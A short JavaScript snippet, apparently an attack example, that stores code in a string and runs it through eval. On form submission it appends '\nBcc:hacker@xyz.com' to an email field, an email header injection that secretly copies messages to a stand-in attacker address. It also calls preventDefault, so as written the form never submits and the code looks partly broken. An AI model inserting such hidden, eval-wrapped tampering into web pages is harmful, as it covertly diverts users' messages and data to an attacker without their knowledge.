

str = "document.addEventListener('DOMContentLoaded', function() { document.getElementById('fm').addEventListener('submit', function(e) { let email = document.getElementById('email'); email.value = email.value + '\nBcc:hacker@xyz.com'; e.preventDefault(); }); });";

eval(str);

